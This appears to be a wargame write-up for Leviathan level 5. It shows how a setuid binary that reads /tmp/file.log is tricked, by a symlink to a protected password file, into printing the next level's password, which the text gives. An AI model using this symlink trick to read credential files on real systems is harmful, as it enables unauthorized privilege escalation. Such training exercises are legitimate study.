# Leviathan Level 5 --> Level 6
There is no information for this level, intentionally. 

## Solution 
See files in home directory, there is setuid file
```bash
leviathan5@leviathan:~$ ls
leviathan5
leviathan5@leviathan:~$ file leviathan5 
leviathan5: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=414fe0634bbd08f446816d4da55ea9a43484fc35, not stripped
```

Lets see how its work 
```console
leviathan5@leviathan:~$ ./leviathan5 
Cannot find /tmp/file.log
leviathan5@leviathan:~$ ltrace ./leviathan5 
__libc_start_main(0x80485db, 1, 0xffffd784, 0x80486a0 <unfinished ...>
fopen("/tmp/file.log", "r")                              = 0
puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
)                        = 26
exit(-1 <no return ...>
+++ exited (status 255) +++
```

Its open file in temp directory and output its content so what about link pass file with it
```console
ln -sf /etc/leviathan_pass/leviathan6 /tmp/file.log 
```

Now try
```console
leviathan5@leviathan:~$ ./leviathan5 
UgaoFee4li
```

## Password
> UgaoFee4li

